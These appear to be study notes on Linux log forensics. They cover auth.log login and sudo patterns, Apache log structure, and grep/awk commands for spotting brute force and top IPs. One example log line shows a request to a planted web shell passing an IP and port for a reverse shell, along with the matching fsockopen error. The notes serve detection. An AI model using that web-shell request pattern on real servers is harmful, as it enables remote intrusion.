6. AUTH LOGS (ACCESS CONTROL)

File

/var/log/auth.log


⸻

Key Patterns

Failed Login

authentication failure user=root

Successful Login

Accepted password for root

Sudo Execution

COMMAND=/usr/bin/systemctl restart apache2


⸻

Advanced Filtering

Brute Force Detection

grep "Failed password" auth.log | wc -l

Unique IPs

grep "Failed password" auth.log | awk '{print $11}' | sort | uniq


⸻

7. APACHE APPLICATION LOGS (ENTRY POINT)

Files

/var/log/apache2/access.log
/var/log/apache2/error.log


⸻

Access Log Structure

IP - - [TIME] "METHOD URL" STATUS SIZE "REFERRER" "USER-AGENT"


⸻

Example Attack

GET /cmd.php?ip=10.10.24.106&port=5000 HTTP/1.1" 200

Interpretation
	•	Web shell accessed
	•	Reverse shell parameters
	•	Success (200)

⸻

Error Log Example

fsockopen(): unable to connect to 10.10.x.x:5000

→ Reverse shell attempt

⸻

Advanced Analysis

Top IPs

awk '{print $1}' access.log | sort | uniq -c | sort -nr

Status Codes

awk '{print $9}' access.log | sort | uniq -c


